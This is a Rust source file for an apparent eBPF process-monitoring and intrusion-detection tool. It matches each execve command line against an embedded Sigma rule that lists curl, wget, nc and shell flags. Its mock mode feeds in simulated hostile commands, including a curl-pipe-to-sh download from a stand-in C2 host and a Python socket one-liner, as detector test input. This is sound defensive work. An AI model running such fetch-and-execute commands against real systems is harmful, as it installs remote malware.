mod telemetry;

use aya::Bpf;
use aya::programs::TracePoint;
use aya::maps::RingBuf;
use std::convert::TryInto;
use std::collections::HashMap;
use tokio::signal;
use std::env;
use std::time::{SystemTime, UNIX_EPOCH};

use spectre_rules::{SigmaRule, SigmaEngine};
use spectre_graph::{ProcessGraph, ProcessKey};

const ARGS_BUF_SIZE: usize = 2048;

#[repr(C)]
#[derive(Debug)]
struct ExecveEvent {
    pid: u32,
    ppid: u32,
    uid: u32,
    args_count: u32,
    args_size: u32,
    comm: [u8; 16],
    args_data: [u8; ARGS_BUF_SIZE],
}

fn now_ns() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos() as u64
}

fn parse_cmdline(event: &ExecveEvent) -> (String, Vec<String>) {
    let size = (event.args_size as usize).min(ARGS_BUF_SIZE);
    let slice = &event.args_data[..size];
    let args: Vec<String> = slice
        .split(|&b| b == 0)
        .filter(|chunk| !chunk.is_empty())
        .map(|chunk| String::from_utf8_lossy(chunk).to_string())
        .collect();

    let full_cmdline = if !args.is_empty() {
        args.join(" ")
    } else {
        let comm = String::from_utf8_lossy(&event.comm);
        comm.trim_matches(char::from(0)).to_string()
    };

    (full_cmdline, args)
}

fn load_default_rules() -> SigmaEngine {
    let yaml = r#"
title: "Webshell and Suspicious Download Detection"
id: "spectre-v2-rule-1"
detection:
  selection_tools:
    CommandLine|contains:
      - "curl"
      - "wget"
      - "python"
      - "bash"
      - "nc"
  selection_suspicious:
    CommandLine|contains:
      - "http://"
      - "https://"
      - "-c"
      - "-e /bin"
      - "sh"
  filter_safe:
    User: "authorized_updater"
  condition: "(selection_tools and selection_suspicious) and not filter_safe"
"#;
    let rule: SigmaRule = serde_yaml::from_str(yaml).expect("Failed to parse default Sigma rule");
    SigmaEngine::parse(&rule).expect("Failed to compile Sigma rule")
}

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    env_logger::init();
    
    let args: Vec<String> = env::args().collect();
    let mock_mode = args.contains(&"--mock".to_string());

    // 60-second TTL
    let mut graph = ProcessGraph::new(60_000_000_000);
    let engine = load_default_rules();
    println!("🛡️  Spectre V2 Initialized: Loaded Sigma Rules & StableDiGraph Engine");

    if mock_mode {
        println!("🚀 Running in MOCK Mode (Simulating kernel telemetry without root)...");
        let simulated_events = vec![
            (1001, 1, "bash", vec!["bash", "-c", "curl http://evil-c2.com/malware.sh | sh"]),
            (1002, 1001, "curl", vec!["curl", "http://evil-c2.com/malware.sh"]),
            (1003, 1, "systemd", vec!["/usr/lib/systemd/systemd-journald"]),
            (1004, 1001, "python3", vec!["python3", "-c", "import socket; s=socket.socket()"]),
        ];

        let mut idx = 0;
        loop {
            tokio::select! {
                _ = signal::ctrl_c() => {
                    println!("Exiting...");
                    break;
                }
                _ = tokio::time::sleep(tokio::time::Duration::from_secs(2)) => {
                    let (pid, ppid, comm, cmd_args) = &simulated_events[idx % simulated_events.len()];
                    idx += 1;

                    let cmdline = cmd_args.join(" ");
                    let ts = now_ns();
                    println!("[EVENT] PID: {} | PPID: {} | Comm: {} | CmdLine: {}", pid, ppid, comm, cmdline);

                    let child_key = ProcessKey::new(*pid, ts);
                    graph.record_spawn_by_ppid(*ppid, child_key, comm, &cmdline, 1000, ts);

                    let mut event_map = HashMap::new();
                    event_map.insert("Image".to_string(), comm.to_string());
                    event_map.insert("CommandLine".to_string(), cmdline.clone());
                    event_map.insert("User".to_string(), "www-data".to_string());

                    if engine.evaluate(&event_map) {
                        println!("🚨 [ALERT] Sigma Rule Triggered: '{}' (ID: {})", engine.rule_title, engine.rule_id);
                        println!("   Offender PID: {} | Cmd: {}", pid, cmdline);

                        // Ancestry enrichment from graph
                        let ancestors = graph.resolve_ancestors(&child_key, 5);
                        println!("   Ancestry Lineage ({} levels):", ancestors.len());
                        for (i, anc) in ancestors.iter().enumerate() {
                            println!("     [{}] PID: {} (Comm: {}, Cmd: {})", i + 1, anc.key.pid, anc.comm, anc.cmdline);
                        }
                    }

                    graph.prune_expired(ts);
                }
            }
        }
    } else {
        let bpf_path = "../ebpf-c/sensor.o";
        println!("Loading eBPF object from {}", bpf_path);
        let mut bpf = Bpf::load_file(bpf_path)?;
        
        let program: &mut TracePoint = bpf.program_mut("handle_execve").unwrap().try_into()?;
        program.load()?;
        program.attach("syscalls", "sys_enter_execve")?;
        println!("Attached tracepoint syscalls:sys_enter_execve!");
        
        let mut ring_buf = RingBuf::try_from(bpf.map_mut("events").unwrap())?;
        println!("Waiting for real kernel process events... Press Ctrl-C to quit.");
        
        loop {
            tokio::select! {
                _ = signal::ctrl_c() => {
                    println!("Exiting...");
                    break;
                }
                _ = tokio::time::sleep(tokio::time::Duration::from_millis(5)) => {
                    let ts = now_ns();
                    while let Some(item) = ring_buf.next() {
                        let data = &*item;
                        if data.len() >= std::mem::size_of::<ExecveEvent>() {
                            let ptr = data.as_ptr() as *const ExecveEvent;
                            let event: &ExecveEvent = unsafe { &*ptr };
                            
                            let (cmdline, _args) = parse_cmdline(event);
                            let comm = String::from_utf8_lossy(&event.comm);
                            let comm_clean = comm.trim_matches(char::from(0));
                            
                            println!("[EVENT] PID: {} | PPID: {} | Comm: {} | CmdLine: {}", 
                                event.pid, event.ppid, comm_clean, cmdline);
                            
                            let child_key = ProcessKey::new(event.pid, ts);
                            graph.record_spawn_by_ppid(event.ppid, child_key, comm_clean, &cmdline, event.uid, ts);
                            
                            let mut event_map = HashMap::new();
                            event_map.insert("Image".to_string(), comm_clean.to_string());
                            event_map.insert("CommandLine".to_string(), cmdline.clone());
                            event_map.insert("User".to_string(), format!("{}", event.uid));
                            
                            if engine.evaluate(&event_map) {
                                println!("🚨 [ALERT] Sigma Rule Triggered: '{}' (ID: {})", engine.rule_title, engine.rule_id);
                                println!("   Offender PID: {} | Cmd: {}", event.pid, cmdline);

                                let ancestors = graph.resolve_ancestors(&child_key, 5);
                                println!("   Ancestry Lineage ({} levels):", ancestors.len());
                                for (i, anc) in ancestors.iter().enumerate() {
                                    println!("     [{}] PID: {} (Comm: {}, Cmd: {})", i + 1, anc.key.pid, anc.comm, anc.cmdline);
                                }
                            }
                        }
                    }
                    graph.prune_expired(ts);
                }
            }
        }
    }

    Ok(())
}
